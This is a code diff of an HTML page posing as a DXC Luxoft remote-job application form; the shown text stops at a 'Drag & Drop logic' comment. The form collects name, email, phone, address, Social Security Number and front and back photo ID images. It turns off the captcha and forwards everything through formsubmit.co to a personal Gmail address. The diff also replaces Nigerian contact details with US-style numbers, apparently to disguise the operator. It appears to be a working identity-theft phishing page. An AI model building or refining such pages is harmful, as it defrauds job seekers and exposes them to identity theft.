@@ -1,297 +1,340 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Apply Now - Luxoft Careers</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Apply for remote job opportunities at DXC Luxoft with this application form." />
+  <meta name="keywords" content="DXC Luxoft, job application, remote jobs, careers" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;600;700&family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="icon" type="image/png" href="favicon.png" />
+  <title>Luxoft Application Form</title>
   <style>
+    :root {
+      --primary-bg: linear-gradient(to bottom, #1A0D2E, #2C1A5B);
+      --text-color: #FFFFFF;
+      --text-secondary: #B0B0B0;
+      --accent-purple: #7C3AED;
+      --accent-hover: #6B21A8;
+      --card-bg: #2C1A5B;
+      --slideshow-bg: #2E1E60;
+      --border-color: rgba(44, 26, 91, 0.5);
+      --font: 'Segoe UI', 'Roboto', sans-serif;
+    }
+
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: 'Roboto', 'Arial', sans-serif;
+      font-family: var(--font);
     }
 
     body {
-      background: linear-gradient(135deg, #1a0d2e, #2c1a5b);
-      color: #ffffff;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      background: var(--primary-bg);
+      color: var(--text-color);
+      font-family: var(--font);
+      line-height: 1.6;
+      font-size: 16px;
       padding: 2rem;
-    }
-
-    .container {
-      background: #2c1a5b;
-      padding: 3rem;
-      border-radius: 16px;
-      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4), inset 0 0 10px rgba(124, 58, 237, 0.2);
-      width: 100%;
-      max-width: 520px;
-      border: 2px solid #7c3aed;
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .container:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 10px 25px rgba(124, 58, 237, 0.5);
     }
 
     h1 {
       text-align: center;
-      font-size: 2.6rem;
-      font-weight: 900;
-      color: #e9d5ff;
-      margin-bottom: 2rem;
-      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+      font-size: 2.5rem;
+      font-weight: 700;
       text-transform: uppercase;
-      letter-spacing: 1px;
+      margin-bottom: 2rem;
     }
 
-    form {
-      display: flex;
-      flex-direction: column;
+    .step {
+      display: none;
+      max-width: 600px;
+      margin: 0 auto;
+      background: var(--card-bg);
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
     }
 
     label {
-      margin-bottom: 0.6rem;
+      display: block;
       font-weight: 600;
-      font-size: 1.2rem;
-      color: #ffffff;
-      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
+      margin-bottom: 0.5rem;
     }
 
     input[type="text"],
     input[type="email"],
-    input[type="tel"],
-    input[type="file"] {
-      margin-bottom: 1.5rem;
-      padding: 0.9rem;
-      border: 2px solid #7c3aed;
-      border-radius: 8px;
-      font-size: 1.1rem;
-      font-weight: 400;
-      background-color: #3c2f6b;
-      color: #ffffff;
-      transition: border-color 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
-    }
-
-    input[type="text"]:hover,
-    input[type="email"]:hover,
-    input[type="tel"]:hover,
-    input[type="file"]:hover {
-      transform: translateY(-2px);
+    input[type="tel"] {
+      width: 100%;
+      padding: 0.75rem;
+      background: rgba(44, 26, 91, 0.3);
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      color: var(--text-color);
+      font-size: 1rem;
     }
 
     input[type="text"]:focus,
     input[type="email"]:focus,
-    input[type="tel"]:focus,
-    input[type="file"]:focus {
+    input[type="tel"]:focus {
       outline: none;
-      border-color: #ec4899;
-      box-shadow: 0 0 12px rgba(236, 72, 153, 0.5);
-      transform: translateY(-2px);
+      border-color: var(--accent-purple);
+      box-shadow: 0 0 5px rgba(124, 58, 237, 0.3);
+    }
+
+    .tooltip {
+      color: var(--accent-purple);
+      cursor: help;
+      margin-left: 0.25rem;
+    }
+
+    .drag-drop {
+      width: 100%;
+      padding: 1.5rem;
+      background: var(--slideshow-bg);
+      border: 2px dashed var(--border-color);
+      border-radius: 4px;
+      text-align: center;
+      color: var(--text-secondary);
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .drag-drop.dragover {
+      background: rgba(46, 30, 96, 0.7);
     }
 
     input[type="file"] {
-      padding: 0.6rem;
-    }
-
-    input::placeholder {
-      color: #c4b5fd;
-      opacity: 0.7;
-      font-weight: 300;
+      display: none;
     }
 
     button {
-      padding: 1rem;
+      display: inline-block;
+      background-color: var(--accent-purple);
+      color: var(--text-color);
+      padding: 1rem 2.5rem;
       border: none;
-      background: linear-gradient(45deg, #7c3aed, #ec4899);
-      color: white;
-      font-size: 1.2rem;
+      border-radius: 4px;
       font-weight: 600;
-      border-radius: 8px;
+      font-size: 1.1rem;
+      text-transform: uppercase;
       cursor: pointer;
-      transition: transform 0.3s ease, box-shadow 0.3s ease, background 0.3s ease;
+      transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
     }
 
     button:hover {
-      transform: translateY(-4px);
-      box-shadow: 0 8px 20px rgba(236, 72, 153, 0.5);
-      background: linear-gradient(45deg, #ec4899, #7c3aed);
+      background-color: var(--accent-hover);
+      transform: scale(1.02);
+      box-shadow: 0 2px 8px rgba(108, 33, 168, 0.3);
     }
 
-    button:active {
-      transform: translateY(0);
-      box-shadow: 0 4px 10px rgba(236, 72, 153, 0.3);
-    }
-
-    .form-group {
-      margin-bottom: 1.2rem;
-    }
-
-    footer {
-      background: linear-gradient(135deg, #2c1a5b, #5b21b6);
-      color: white;
+    #loading {
+      display: none;
       text-align: center;
-      padding: 1.5rem;
-      font-size: 0.95rem;
-      font-weight: 300;
-      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.3);
-      position: fixed;
-      bottom: 0;
-      width: 100%;
+      margin-top: 1rem;
+      color: var(--text-secondary);
+    }
+
+    /* Step Indicator */
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+
+    .step-dot {
+      width: 12px;
+      height: 12px;
+      background: var(--text-secondary);
+      border-radius: 50%;
+      transition: background 0.3s ease;
+    }
+
+    .step-dot.active {
+      background: var(--accent-purple);
+    }
+
+    /* Button Container */
+    .button-container {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 1.5rem;
+    }
+
+    /* Footer */
+    footer {
+      background: rgba(26, 13, 46, 0.9);
+      color: var(--text-secondary);
+      text-align: center;
+      padding: 2rem;
+      margin-top: 2rem;
+      border-top: 1px solid rgba(44, 26, 91, 0.3);
     }
 
     footer a {
-      color: #ec4899;
+      color: var(--accent-purple);
       text-decoration: none;
-      font-weight: 400;
-      transition: color 0.3s ease, text-shadow 0.3s ease;
+      transition: color 0.3s ease;
     }
 
     footer a:hover {
-      color: #f9a8d4;
-      text-shadow: 0 0 5px rgba(236, 72, 153, 0.5);
+      color: var(--accent-hover);
+      text-decoration: underline;
     }
 
+    /* Responsive */
     @media (max-width: 768px) {
-      .container {
-        padding: 2rem;
-        max-width: 90%;
-      }
-
       h1 {
         font-size: 2rem;
       }
 
-      label {
-        font-size: 1.1rem;
+      .step {
+        padding: 1.5rem;
       }
 
       input[type="text"],
       input[type="email"],
-      input[type="tel"],
-      input[type="file"],
+      input[type="tel"] {
+        padding: 0.5rem;
+      }
+
       button {
+        padding: 0.75rem 2rem;
         font-size: 1rem;
       }
     }
 
     @media (max-width: 480px) {
       h1 {
-        font-size: 1.7rem;
+        font-size: 1.5rem;
       }
 
-      .container {
-        padding: 1.5rem;
+      .step {
+        padding: 1rem;
+      }
+
+      .form-group {
+        margin-bottom: 1rem;
       }
 
       button {
-        padding: 0.9rem;
+        padding: 0.5rem 1.5rem;
       }
 
-      label {
-        font-size: 1rem;
+      .button-container {
+        flex-direction: column;
+        gap: 1rem;
       }
-      .step {
-      display: none;
-    }
-    .step.active {
-      display: block;
-    }
-    .tooltip {
-      cursor: help;
-      border-bottom: 1px dotted #fff;
-    }
-    .drag-drop {
-      border: 2px dashed #7c3aed;
-      padding: 1rem;
-      text-align: center;
-      color: #c4b5fd;
-      margin-bottom: 1.5rem;
-      border-radius: 8px;
-    }
-    .drag-drop.dragover {
-      background-color: #3c2f6b;
-    }
-    #loading {
-      display: none;
-      text-align: center;
-      margin-top: 1rem;
-      color: #c4b5fd;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Luxoft Application Form</h1>
-    <form id="applicationForm" action="https://formsubmit.co/michael.adeshina240221118@st.lasu.edu.ng" method="POST" enctype="multipart/form-data">
-      <input type="hidden" name="_captcha" value="false" />
-      <input type="hidden" name="_template" value="table" />
-      <input type="hidden" name="_redirect" value="thankyou.html" />
-
-      <!-- Step 1: Personal Info -->
-      <div class="step active" id="step1">
-        <div class="form-group">
-          <label for="fullname">Full Name</label>
-          <input type="text" id="fullname" name="Full Name" placeholder="Enter your full name" required />
-        </div>
-        <div class="form-group">
-          <label for="email">Email <span class="tooltip" title="We'll never share your email.">ⓘ</span></label>
-          <input type="email" id="email" name="Email" placeholder="Enter your email" required />
-        </div>
-        <div class="form-group">
-          <label for="phone">Phone Number</label>
-          <input type="tel" id="phone" name="Phone Number" placeholder="Enter your phone number" required />
-        </div>
-        <button type="button" onclick="nextStep()">Next</button>
-      </div>
-
-      <!-- Step 2: Address & ID -->
-      <div class="step" id="step2">
-        <div class="form-group">
-          <label for="address">Address</label>
-          <input type="text" id="address" name="Address" placeholder="Enter your address" required />
-        </div>
-        <div class="form-group">
-          <label for="ssn">SSN <span class="tooltip" title="Enter 9-digit Social Security Number.">ⓘ</span></label>
-          <input type="text" id="ssn" name="SSN" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required />
-        </div>
-        <button type="button" onclick="nextStep()">Next</button>
-      </div>
-
-      <!-- Step 3: Uploads -->
-      <div class="step" id="step3">
-        <div class="form-group">
-          <label for="id-front">Photo ID (Front)</label>
-          <div class="drag-drop" id="drop-front">Drag & drop or click to upload</div>
-          <input type="file" id="id-front" name="ID_Front" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;" />
-        </div>
-        <div class="form-group">
-          <label for="id-back">Photo ID (Back)</label>
-          <div class="drag-drop" id="drop-back">Drag & drop or click to upload</div>
-          <input type="file" id="id-back" name="ID_Back" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;" />
-        </div>
-        <button type="submit">Submit Application</button>
-        <div id="loading">Submitting your application...</div>
-      </div>
-    </form>
+  <h1>Luxoft Application Form</h1>
+  <div class="step-indicator">
+    <span class="step-dot active"></span>
+    <span class="step-dot"></span>
+    <span class="step-dot"></span>
   </div>
+  <form id="applicationForm" action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="_captcha" value="false" />
+    <input type="hidden" name="_template" value="table" />
+    <input type="hidden" name="_redirect" value="thankyou.html" />
+
+    <!-- Step 1: Personal Info -->
+    <div class="step active" id="step1">
+      <div class="form-group">
+        <label for="fullname">Full Name</label>
+        <input type="text" id="fullname" name="Full Name" placeholder="Enter your full name" required />
+      </div>
+      <div class="form-group">
+        <label for="email">Email <span class="tooltip" title="We'll never share your email.">ⓘ</span></label>
+        <input type="email" id="email" name="Email" placeholder="Enter your email" required />
+      </div>
+      <div class="form-group">
+        <label for="phone">Phone Number</label>
+        <input type="tel" id="phone" name="Phone Number" placeholder="Enter your phone number" required />
+      </div>
+      <div class="button-container">
+        <button type="button" onclick="nextStep()">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 2: Address & ID -->
+    <div class="step" id="step2">
+      <div class="form-group">
+        <label for="address">Address</label>
+        <input type="text" id="address" name="Address" placeholder="Enter your address" required />
+      </div>
+      <div class="form-group">
+        <label for="ssn">SSN <span class="tooltip" title="Enter 9-digit Social Security Number.">ⓘ</span></label>
+        <input type="text" id="ssn" name="SSN" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required />
+      </div>
+      <div class="button-container">
+        <button type="button" onclick="prevStep()">Back</button>
+        <button type="button" onclick="nextStep()">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 3: Uploads -->
+    <div class="step" id="step3">
+      <div class="form-group">
+        <label for="id-front">Photo ID (Front)</label>
+        <div class="drag-drop" id="drop-front">Drag & drop or click to upload</div>
+        <input type="file" id="id-front" name="ID_Front" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;" />
+      </div>
+      <div class="form-group">
+        <label for="id-back">Photo ID (Back)</label>
+        <div class="drag-drop" id="drop-back">Drag & drop or click to upload</div>
+        <input type="file" id="id-back" name="ID_Back" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;" />
+      </div>
+      <div class="button-container">
+        <button type="button" onclick="prevStep()">Back</button>
+        <button type="submit">Submit Application</button>
+      </div>
+      <div id="loading">Submitting your application...</div>
+    </div>
+  </form>
 
   <footer>
-    <p>Email: <a href="mailto:michael.adeshina240221118@st.lasu.edu.ng">michael.adeshina240221118@st.lasu.edu.ng</a> |
-      Call: <a href="tel:+234805598731">0805 598 731</a> |
-      WhatsApp: <a href="https://wa.me/234813476514">0813 476 514</a></p>
+    <p>Email: <a href="mailto:luxoftorganization@gmail.com">luxoftorganization@gmail.com</a> |
+      Phone: <a href="tel:+14805598731">480 559 8731</a> |
+      WhatsApp: <a href="https://wa.me/+19713476514">971 347 6514</a></p>
   </footer>
 
   <script>
     let currentStep = 1;
     function nextStep() {
-      document.getElementById(`step${currentStep}`).classList.remove("active");
-      currentStep++;
-      document.getElementById(`step${currentStep}`).classList.add("active");
+      if (currentStep < 3) {
+        document.getElementById(`step${currentStep}`).classList.remove("active");
+        currentStep++;
+        document.getElementById(`step${currentStep}`).classList.add("active");
+        updateStepIndicator();
+      }
+    }
+
+    function prevStep() {
+      if (currentStep > 1) {
+        document.getElementById(`step${currentStep}`).classList.remove("active");
+        currentStep--;
+        document.getElementById(`step${currentStep}`).classList.add("active");
+        updateStepIndicator();
+      }
+    }
+
+    // Update step indicator
+    function updateStepIndicator() {
+      const dots = document.querySelectorAll(".step-dot");
+      dots.forEach((dot, index) => {
+        dot.classList.toggle("active", index === currentStep - 1);
+      });
     }
 
     // Drag & Drop logic
